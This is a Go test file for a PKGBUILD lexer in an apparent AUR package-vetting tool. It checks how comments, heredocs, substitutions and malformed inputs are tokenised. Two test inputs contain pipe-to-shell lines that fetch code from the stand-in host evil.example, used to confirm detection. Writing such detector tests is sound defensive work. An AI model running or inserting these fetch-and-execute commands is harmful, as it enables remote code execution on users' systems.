// internal/pkgbuild/lex_test.go
package pkgbuild

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// fixture reads a testdata PKGBUILD. The fixtures are real cache entries;
// testdata/pkgbuild/PROVENANCE.md records which upstream recipe each came from.
func fixture(t *testing.T, name string) []byte {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("..", "..", "testdata", "pkgbuild", name))
	if err != nil {
		t.Fatal(err)
	}
	return b
}

// livePKGBUILDs locates the helper cache on the machine running the test. The
// cache is 88 GB and must never enter the repo, so the live measurements read
// it in place and the fixtures are small excerpts of it.
func livePKGBUILDs(t *testing.T) []string {
	t.Helper()
	dir := os.Getenv("AURVET_LIVE_PKGBUILD_DIR")
	if dir == "" {
		home, err := os.UserHomeDir()
		if err != nil {
			t.Fatal(err)
		}
		dir = filepath.Join(home, ".cache", "yay")
	}
	paths, err := filepath.Glob(filepath.Join(dir, "*", "PKGBUILD"))
	if err != nil || len(paths) == 0 {
		t.Skipf("no PKGBUILDs under %s (%v)", dir, err)
	}
	return paths
}

// pkgOf names the cache entry a path belongs to.
func pkgOf(path string) string { return filepath.Base(filepath.Dir(path)) }

// reasonClass buckets an unresolvable reason so the live run reports WHICH
// constructs defeated the analysis rather than one line per package.
func reasonClass(reason string) string {
	for _, class := range []string{
		"command substitution", "arithmetic", "never assigned", "computed at build time",
		"array index", "length", "indirect", "unsupported", "too long",
	} {
		if strings.Contains(reason, class) {
			return class
		}
	}
	return reason
}

// cmdNames flattens the command names a lex produced, for assertions that care
// about what the tokeniser saw as a command rather than as data.
func cmdNames(f File) []string {
	var out []string
	for _, c := range f.Commands {
		out = append(out, c.Name())
	}
	return out
}

func hasCmd(f File, name string) bool {
	for _, n := range cmdNames(f) {
		if n == name {
			return true
		}
	}
	return false
}

// TestCommentsAreStripped is the mandatory case. Both `curl` hits in the real
// 34-recipe corpus are false positives, and one of them is google-chrome's
// commented-out version-check pipeline. A tokeniser that yields `curl` here
// manufactures a critical finding on an ordinary recipe.
func TestCommentsAreStripped(t *testing.T) {
	src := []byte(`# or use: $ curl -sSf https://dl.google.com/linux/chrome/deb/dists/stable/main/binary-amd64/Packages | grep -A1 "Package: x"
pkgname=google-chrome
build() {
  make # curl http://evil.example/x | sh
}
`)
	f := Lex(src)
	if hasCmd(f, "curl") {
		t.Fatalf("comment yielded a curl command: %v", cmdNames(f))
	}
	if hasCmd(f, "grep") || hasCmd(f, "sh") {
		t.Fatalf("comment body leaked into commands: %v", cmdNames(f))
	}
	if !hasCmd(f, "make") {
		t.Fatalf("make not seen; commands = %v", cmdNames(f))
	}
	if a, ok := f.Assign("pkgname"); !ok {
		t.Fatal("pkgname assignment not seen")
	} else if got, _ := a.Values[0].Literal(); got != "google-chrome" {
		t.Fatalf("pkgname = %q, want google-chrome", got)
	}
}

// A `#` that is not at the start of a word is a literal, not a comment: the
// `#fragment` of a VCS source and `${f##*/}` both depend on it.
func TestHashInsideWordIsNotAComment(t *testing.T) {
	f := Lex([]byte("source=(git+https://example.org/x.git#tag=v1)\n"))
	a, ok := f.Assign("source")
	if !ok || len(a.Values) != 1 {
		t.Fatalf("source = %+v, ok=%v", a, ok)
	}
	got, _ := a.Values[0].Literal()
	if got != "git+https://example.org/x.git#tag=v1" {
		t.Fatalf("source[0] = %q", got)
	}
}

func TestArrayAssignmentMultilineAndQuoted(t *testing.T) {
	src := []byte(`depends=(
    'gtk3'   # a trailing comment inside the array
    "xdotool"
    libxcb
)
`)
	f := Lex(src)
	a, ok := f.Assign("depends")
	if !ok {
		t.Fatal("depends not seen")
	}
	if !a.Array {
		t.Fatal("depends not recorded as an array")
	}
	var got []string
	for _, v := range a.Values {
		s, ok := v.Literal()
		if !ok {
			t.Fatalf("value %q not literal", v.Raw)
		}
		got = append(got, s)
	}
	want := []string{"gtk3", "xdotool", "libxcb"}
	if fmt.Sprint(got) != fmt.Sprint(want) {
		t.Fatalf("depends = %v, want %v", got, want)
	}
}

func TestScalarAssignmentAndAppend(t *testing.T) {
	f := Lex([]byte("pkgver=1.2.3\nsource=(a)\nsource+=(b)\n"))
	if a, ok := f.Assign("pkgver"); !ok || a.Array {
		t.Fatalf("pkgver = %+v ok=%v; want scalar", a, ok)
	}
	var appends int
	for _, a := range f.Assignments {
		if a.Name == "source" && a.Append {
			appends++
		}
	}
	if appends != 1 {
		t.Fatalf("source+= appends = %d, want 1", appends)
	}
}

// The 29% blind spot: 10 of 34 cached recipes carry their real sources in an
// arch-suffixed variable. The tokeniser must split the suffix off so resolution
// can target an architecture other than the one it runs on.
func TestArchSuffixedAssignment(t *testing.T) {
	f := Lex(fixture(t, "rustdesk-bin.pkgbuild"))
	if _, ok := f.Assign("source"); ok {
		t.Fatal("rustdesk-bin has no unsuffixed source=, but one was reported")
	}
	seen := map[string]string{}
	for _, a := range f.Assignments {
		if a.Base == "source" {
			seen[a.Arch] = a.Name
		}
	}
	if seen["x86_64"] != "source_x86_64" || seen["aarch64"] != "source_aarch64" {
		t.Fatalf("arch-suffixed sources = %v", seen)
	}
	for _, a := range f.Assignments {
		if a.Base == "sha256sums" && a.Arch == "" {
			t.Fatalf("sha256sums_%s lost its suffix: %+v", a.Arch, a)
		}
	}
}

func TestFunctionsAndCommandAttribution(t *testing.T) {
	f := Lex(fixture(t, "gdm-settings.pkgbuild"))
	for _, name := range []string{"build", "check", "package"} {
		if _, ok := f.Function(name); !ok {
			t.Fatalf("function %s not found; got %+v", name, f.Functions)
		}
	}
	var inBuild []string
	for _, c := range f.Commands {
		if c.Func == "build" {
			inBuild = append(inBuild, c.Name())
		}
	}
	if fmt.Sprint(inBuild) != fmt.Sprint([]string{"arch-meson", "meson"}) {
		t.Fatalf("build() commands = %v", inBuild)
	}
	fn, _ := f.Function("build")
	if !strings.Contains(fn.Body, "arch-meson") || strings.Contains(fn.Body, "meson test") {
		t.Fatalf("build() body wrong:\n%s", fn.Body)
	}
}

// A heredoc body is data. flutter-bin writes three wrapper scripts with
// `cat > x.sh << 'END'`, and their bodies contain `source /opt/flutter/...`.
// Parsing the body as commands invents an external include the recipe never
// executes -- which is exactly how a corpus of 34 grows two phantom `source`
// builtins.
func TestHeredocBodyIsDataNotCommands(t *testing.T) {
	f := Lex(fixture(t, "flutter-bin-heredoc-excerpt.pkgbuild"))
	if len(f.Heredocs) != 2 {
		t.Fatalf("heredocs = %d, want 2: %+v", len(f.Heredocs), f.Heredocs)
	}
	for _, h := range f.Heredocs {
		if h.Delim != "END" || !h.Terminated || h.Expand {
			t.Fatalf("heredoc = %+v; want delim END, terminated, no expansion", h)
		}
		if !strings.Contains(h.Body, "source /opt/flutter/bin/aur_init.sh") {
			t.Fatalf("heredoc body lost its contents: %q", h.Body)
		}
		if h.Func != "_gen_scripts" {
			t.Fatalf("heredoc Func = %q, want _gen_scripts", h.Func)
		}
	}
	for _, c := range f.Commands {
		if c.Name() == "source" || c.Name() == "exec" || c.Name() == "which" {
			t.Fatalf("heredoc body was parsed as a command: %+v", c)
		}
	}
	if f.Note(NoteExternalSource) {
		t.Fatal("heredoc body produced a phantom external-source note")
	}
	if !hasCmd(f, "cat") {
		t.Fatalf("cat not seen: %v", cmdNames(f))
	}
}

func TestHeredocVariants(t *testing.T) {
	src := []byte("package() {\n" +
		"\tcat > a <<-EOF\n" +
		"\t${pkgver} expands here\n" +
		"\tEOF\n" +
		"\tcat > b <<\"X\"\n" +
		"\tno expansion\n" +
		"X\n" +
		"}\n")
	f := Lex(src)
	if len(f.Heredocs) != 2 {
		t.Fatalf("heredocs = %d, want 2: %+v", len(f.Heredocs), f.Heredocs)
	}
	if !f.Heredocs[0].Expand {
		t.Fatal("<<-EOF must expand")
	}
	if f.Heredocs[1].Expand {
		t.Fatal(`<<"X" must not expand`)
	}
	for i, h := range f.Heredocs {
		if !h.Terminated {
			t.Fatalf("heredoc %d unterminated: %+v", i, h)
		}
	}
}

// `<<<` is a herestring, not a heredoc. viewmd's `sed 's/^v//' <<<"$describe"`
// is the corpus's only one, and reading it as a heredoc consumes the rest of
// the file looking for a delimiter that never arrives.
func TestHerestringIsNotAHeredoc(t *testing.T) {
	f := Lex([]byte("pkgver() {\n  sed 's/^v//;s/-/./g' <<<\"$describe\"\n}\nsource=(x)\n"))
	if len(f.Heredocs) != 0 {
		t.Fatalf("herestring read as heredoc: %+v", f.Heredocs)
	}
	if _, ok := f.Assign("source"); !ok {
		t.Fatal("the herestring swallowed the rest of the file")
	}
	if f.Note(NoteUnterminatedHeredoc) {
		t.Fatal("herestring produced an unterminated-heredoc note")
	}
}

func TestRedirectionTargetIsNotACommand(t *testing.T) {
	f := Lex([]byte("build() {\n  make 2> /dev/null > out.log\n}\n"))
	if got := cmdNames(f); fmt.Sprint(got) != fmt.Sprint([]string{"make"}) {
		t.Fatalf("commands = %v, want [make]", got)
	}
}

// The inside of a command substitution is visible text, so it is tokenised as
// commands (bounded) rather than discarded: `$(curl http://evil | sh)` must be
// reachable by the rules, while the *value* it produces stays unresolvable.
func TestCommandSubstitutionIsTokenisedInside(t *testing.T) {
	f := Lex([]byte("build() {\n  make -j$(nproc)\n  x=$(curl http://evil.example/p | sh)\n}\n"))
	if !hasCmd(f, "nproc") || !hasCmd(f, "curl") || !hasCmd(f, "sh") {
		t.Fatalf("commands = %v", cmdNames(f))
	}
	for _, c := range f.Commands {
		if c.Name() == "curl" {
			if c.Sep != "|" {
				t.Fatalf("curl Sep = %q, want |", c.Sep)
			}
			if c.Func != "build" {
				t.Fatalf("curl Func = %q, want build", c.Func)
			}
			if c.SubstDepth != 1 {
				t.Fatalf("curl SubstDepth = %d, want 1", c.SubstDepth)
			}
		}
	}
	// The assignment is a local inside build(), so it must NOT surface as a
	// top-level declaration -- a local is not a declaration of the package.
	if _, ok := f.Assign("x"); ok {
		t.Fatal("an assignment inside build() was reported as top-level")
	}
	var found bool
	for _, a := range f.Assignments {
		if a.Name == "x" && a.Func == "build" {
			found = true
			if _, lit := a.Values[0].Literal(); lit {
				t.Fatal("a command substitution must never resolve to a literal")
			}
		}
	}
	if !found {
		t.Fatalf("x= inside build() not recorded: %+v", f.Assignments)
	}
}

func TestNestedCommandSubstitution(t *testing.T) {
	f := Lex([]byte("pkgver=$(echo $(date +%s) | tr -d x)\n"))
	if !hasCmd(f, "echo") || !hasCmd(f, "date") || !hasCmd(f, "tr") {
		t.Fatalf("commands = %v", cmdNames(f))
	}
	a, _ := f.Assign("pkgver")
	if len(a.Values) != 1 || len(a.Values[0].Segs) != 1 || a.Values[0].Segs[0].Kind != SegCommandSub {
		t.Fatalf("pkgver segments = %+v", a.Values)
	}
}

func TestBacktickSubstitution(t *testing.T) {
	f := Lex([]byte("build() {\n  x=`uname -m`\n}\n"))
	if !hasCmd(f, "uname") {
		t.Fatalf("commands = %v", cmdNames(f))
	}
}

func TestArithmeticIsNotACommandSubstitution(t *testing.T) {
	f := Lex([]byte("pkgrel=$((1 + 1))\n"))
	a, ok := f.Assign("pkgrel")
	if !ok || len(a.Values[0].Segs) != 1 || a.Values[0].Segs[0].Kind != SegArith {
		t.Fatalf("pkgrel = %+v ok=%v", a, ok)
	}
	if len(f.Commands) != 0 {
		t.Fatalf("arithmetic produced commands: %v", cmdNames(f))
	}
}

// eval is in 3 of 34 legitimate recipes, so it is recorded, never rated. What
// it generates is not in the source text; that is task 7's gap, not a finding.
func TestEvalIsRecordedNotJudged(t *testing.T) {
	f := Lex(fixture(t, "flutter-eval-excerpt.pkgbuild"))
	if !f.Note(NoteEval) {
		t.Fatalf("eval not noted: %+v", f.Notes)
	}
	if !hasCmd(f, "eval") {
		t.Fatalf("eval command not recorded: %v", cmdNames(f))
	}
	// The generated function bodies are not in the text, so no package_*
	// function may be reported -- the whole point of the eval measurement.
	for _, fn := range f.Functions {
		if strings.HasPrefix(fn.Name, "package_") {
			t.Fatalf("invented a generated function: %+v", fn)
		}
	}
	if a, ok := f.Assign("pkgname"); !ok || !a.Array || len(a.Values) != 17 {
		t.Fatalf("pkgname array = %+v ok=%v", a, ok)
	}
}

// `source=(...)` is an assignment; `source foo.sh` is the bash builtin pulling
// in a file this tool never sees. Conflating them either invents an array or
// misses a real external include.
func TestExternalSourceBuiltinVersusAssignment(t *testing.T) {
	f := Lex([]byte("source=(a b)\nbuild() {\n  source /usr/share/nvm/init-nvm.sh || [[ $? != 1 ]]\n  . ./other.sh\n}\n"))
	a, ok := f.Assign("source")
	if !ok || len(a.Values) != 2 {
		t.Fatalf("source array = %+v ok=%v", a, ok)
	}
	if !f.Note(NoteExternalSource) {
		t.Fatalf("external source builtin not noted: %+v", f.Notes)
	}
	var n int
	for _, note := range f.Notes {
		if note.Kind == NoteExternalSource {
			n++
		}
	}
	if n != 2 {
		t.Fatalf("external-source notes = %d, want 2 (source and .)", n)
	}
}

func TestParameterExpansionSegments(t *testing.T) {
	f := Lex(fixture(t, "dart-sdk-dev.pkgbuild"))
	a, ok := f.Assign("source")
	if !ok || len(a.Values) != 1 {
		t.Fatalf("source = %+v ok=%v", a, ok)
	}
	var found bool
	for _, s := range a.Values[0].Segs {
		if s.Kind == SegVar && s.Var == "pkgver" && s.Op == "//" && s.Arg == "_/-" {
			found = true
		}
	}
	if !found {
		t.Fatalf("${pkgver//_/-} not segmented: %+v", a.Values[0].Segs)
	}
}

func TestSingleQuotesSuppressExpansion(t *testing.T) {
	f := Lex([]byte("x='$pkgver and $(id)'\n"))
	a, _ := f.Assign("x")
	got, lit := a.Values[0].Literal()
	if !lit || got != "$pkgver and $(id)" {
		t.Fatalf("x = %q lit=%v", got, lit)
	}
	if len(f.Commands) != 0 {
		t.Fatalf("single-quoted text produced commands: %v", cmdNames(f))
	}
}

func TestLineContinuationAndLineNumbers(t *testing.T) {
	f := Lex([]byte("pkgname=a\n\nbuild() {\n  make \\\n    all\n  echo hi\n}\n"))
	var got []struct {
		name string
		line int
	}
	for _, c := range f.Commands {
		got = append(got, struct {
			name string
			line int
		}{c.Name(), c.Line})
	}
	if len(got) != 2 || got[0].name != "make" || got[0].line != 4 || got[1].name != "echo" || got[1].line != 6 {
		t.Fatalf("commands = %+v", got)
	}
	// `make \<newline> all` is one command of two words, and the continuation
	// must not split it into two commands (checked above) nor merge the words.
	if len(f.Commands[0].Words) != 2 {
		t.Fatalf("continued command words = %+v, want 2", f.Commands[0].Words)
	}
}

func TestKeywordsAreNotCommandNames(t *testing.T) {
	f := Lex([]byte("build() {\n  if ! grep -q x file; then\n    make\n  fi\n  for f in a b; do echo $f; done\n}\n"))
	for _, want := range []string{"grep", "make", "echo"} {
		if !hasCmd(f, want) {
			t.Fatalf("%s not seen: %v", want, cmdNames(f))
		}
	}
	for _, bad := range []string{"if", "then", "fi", "do", "done", "!"} {
		if hasCmd(f, bad) {
			t.Fatalf("keyword %q reported as a command name: %v", bad, cmdNames(f))
		}
	}
}

func TestUnterminatedConstructsAreNoted(t *testing.T) {
	cases := []struct {
		name string
		src  string
		kind NoteKind
	}{
		{"quote", "source=('unclosed\n", NoteUnterminatedQuote},
		{"dquote", "source=(\"unclosed\n", NoteUnterminatedQuote},
		{"heredoc", "package() {\n cat <<EOF\nbody\n}\n", NoteUnterminatedHeredoc},
		{"function", "package() {\n  make\n", NoteUnterminatedFunction},
		{"substitution", "pkgver=$(echo\n", NoteUnterminatedSubstitution},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := Lex([]byte(tc.src))
			if !f.Note(tc.kind) {
				t.Fatalf("note %q missing: %+v", tc.kind, f.Notes)
			}
		})
	}
}

func TestOversizedInputIsTruncatedNotRead(t *testing.T) {
	src := append([]byte("pkgname=a\n"), []byte(strings.Repeat("x=1\n", 2<<20))...)
	f := Lex(src)
	if !f.Truncated || !f.Note(NoteTruncated) {
		t.Fatalf("oversized input not truncated: truncated=%v notes=%+v", f.Truncated, f.Notes)
	}
	if _, ok := f.Assign("pkgname"); !ok {
		t.Fatal("truncation dropped what was read before the limit")
	}
}

// Hostile shapes: every one of these must terminate quickly and none may panic.
// Task 14 fuzzes this; these are the shapes a fuzzer takes a long time to find.
func TestHostileInputTerminates(t *testing.T) {
	cases := map[string]string{
		"deep substitution": strings.Repeat("$(", 5000) + strings.Repeat(")", 5000),
		"deep braces":       "build() {" + strings.Repeat("{ ", 5000) + strings.Repeat("} ", 5000) + "}",
		"deep arith":        strings.Repeat("$((", 4000) + strings.Repeat("))", 4000),
		"open quotes":       strings.Repeat("'", 100000),
		"open dquotes":      strings.Repeat("\"", 100000),
		"open expansion":    strings.Repeat("${", 50000),
		"open array":        "source=(" + strings.Repeat("a ", 100000),
		"nul bytes":         strings.Repeat("\x00", 100000),
		"heredoc flood":     strings.Repeat("cat <<EOF\n", 20000),
		"backtick flood":    strings.Repeat("`", 100000),
		"crlf":              strings.Repeat("x=1\r\n", 10000),
		"no newline":        strings.Repeat("x=1;", 100000),
		"invalid utf8":      strings.Repeat("\xff\xfe", 50000),
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			done := make(chan File, 1)
			go func() {
				defer func() {
					if r := recover(); r != nil {
						t.Errorf("panic: %v", r)
						done <- File{}
					}
				}()
				done <- Lex([]byte(src))
			}()
			select {
			case <-done:
			case <-time.After(10 * time.Second):
				t.Fatal("Lex did not terminate")
			}
		})
	}
}

// TestLiveCorpusLex measures the tokeniser against the machine's real helper
// cache -- 34 PKGBUILDs, 88 GB of cache that must never enter the repo. Skipped
// by default because no unit test may depend on the state of a user's cache.
// Run with AURVET_LIVE_PKGBUILD=1 to reproduce the numbers in the receipt.
func TestLiveCorpusLex(t *testing.T) {
	if os.Getenv("AURVET_LIVE_PKGBUILD") != "1" {
		t.Skip("set AURVET_LIVE_PKGBUILD=1 to measure against the live helper cache")
	}
	paths := livePKGBUILDs(t)
	var (
		notes   = map[NoteKind]int{}
		files   int
		clean   int
		arch    int
		heredoc int
		subst   int
	)
	for _, p := range paths {
		src, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		f := Lex(src)
		files++
		if len(f.Notes) == 0 {
			clean++
		}
		kinds := map[NoteKind]bool{}
		for _, n := range f.Notes {
			kinds[n.Kind] = true
		}
		for k := range kinds {
			notes[k]++
		}
		if len(f.Heredocs) > 0 {
			heredoc++
		}
		for _, a := range f.Assignments {
			if a.Base == "source" && a.Arch != "" {
				arch++
				break
			}
		}
		for _, c := range f.Commands {
			if c.SubstDepth > 0 {
				subst++
				break
			}
		}
		t.Logf("%-44s notes=%d funcs=%d cmds=%d assigns=%d heredocs=%d",
			pkgOf(p), len(f.Notes), len(f.Functions), len(f.Commands), len(f.Assignments), len(f.Heredocs))
	}
	t.Logf("corpus=%d note-free=%d arch-suffixed-source=%d with-heredocs=%d with-substitution=%d",
		files, clean, arch, heredoc, subst)
	for k, n := range notes {
		t.Logf("note %-28s in %d recipes", k, n)
	}
}

func TestEmptyInput(t *testing.T) {
	f := Lex(nil)
	if len(f.Commands) != 0 || len(f.Assignments) != 0 || len(f.Notes) != 0 || f.Truncated {
		t.Fatalf("empty input produced %+v", f)
	}
}
